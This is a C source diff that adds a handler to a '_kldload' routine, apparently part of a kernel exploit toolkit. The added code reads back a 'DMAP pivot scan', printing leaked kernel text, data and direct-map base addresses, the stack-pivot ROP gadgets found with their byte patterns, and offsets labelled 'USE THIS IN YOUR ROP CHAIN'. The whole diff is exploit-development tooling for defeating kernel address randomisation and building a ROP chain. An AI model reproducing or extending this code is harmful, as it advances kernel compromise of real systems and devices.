@@ -547,6 +547,66 @@ static void _kldload(void* data, size_t data_size)
         }
 
         printf("\n=== END BATCH PIVOT SCAN ===\n");
+    } else if (magic == 0x50535243) { /* "PSRC" - DMAP pivot scan results */
+        uint32_t num_hits = (uint32_t)(readback[0] >> 32);
+        uint64_t rb_kdata = readback[1];
+        uint64_t rb_ktext = readback[2];
+        uint64_t rb_dmap  = readback[3];
+        uint64_t scanned  = readback[4];
+        uint64_t status   = readback[5];
+
+        const char* pattern_names[] = {
+            "xchg rsp,rax; ret  (48 94 C3)",
+            "push rax; pop rsp; ret (50 5C C3)",
+            "mov rsp,rax; ret  (48 89 C4 C3)",
+            "xchg rsp,rax; ret  (48 87 E0 C3)",
+        };
+
+        printf("\n=== DMAP PIVOT SCAN RESULTS ===\n");
+        printf("  kdata_base:     %#lx\n", rb_kdata);
+        printf("  ktext_base:     %#lx\n", rb_ktext);
+        printf("  dmap_base:      %#lx\n", rb_dmap);
+        printf("  bytes_scanned:  %#lx (%lu MB)\n", scanned, scanned / (1024*1024));
+        printf("  status:         %s\n",
+               status == 1 ? "COMPLETE" :
+               status == 0xAAAA ? "IN PROGRESS (thread died)" :
+               status == 0xDEAD ? "DMAP INIT FAILED" : "UNKNOWN");
+        printf("  hits:           %u\n\n", num_hits);
+
+        if (num_hits > 0) {
+            printf("  >>> PIVOT GADGETS FOUND! <<<\n\n");
+        }
+
+        for (uint32_t i = 0; i < num_hits && i < 70; i++) {
+            int base = 6 + i * 4;
+            uint64_t addr     = readback[base + 0];
+            uint64_t kt_off   = readback[base + 1];
+            uint64_t pat_info = readback[base + 2];
+            uint64_t context  = readback[base + 3];
+            int pat_id  = (int)(pat_info & 0xFF);
+            int pat_len = (int)((pat_info >> 8) & 0xFF);
+
+            printf("  [%2u] addr=%#lx  ktext+%#lx  kdata_off=%+ld\n",
+                   i, addr, kt_off, (int64_t)(addr - rb_kdata));
+            printf("       pattern=%d (%s)\n",
+                   pat_id, pat_id < 4 ? pattern_names[pat_id] : "unknown");
+            printf("       len=%d  context(8 bytes before): ", pat_len);
+            for (int b = 0; b < 8; b++)
+                printf("%02x ", (uint8_t)(context >> (b * 8)));
+            printf("\n\n");
+        }
+
+        if (num_hits > 0) {
+            /* Print usable offsets for the first hit */
+            uint64_t best_addr = readback[6];
+            int64_t kdata_off = (int64_t)(best_addr - rb_kdata);
+            printf("  === USE THIS IN YOUR ROP CHAIN ===\n");
+            printf("  kdata_base + (%ld)  =  kdata_base - 0x%lx\n",
+                   kdata_off, (uint64_t)(-kdata_off));
+            printf("  ktext_base + %#lx\n", readback[7]);
+        }
+
+        printf("\n=== END DMAP PIVOT SCAN ===\n");
     } else {
         /* Generic readback - check for test markers */
         uint64_t val0 = readback[0];
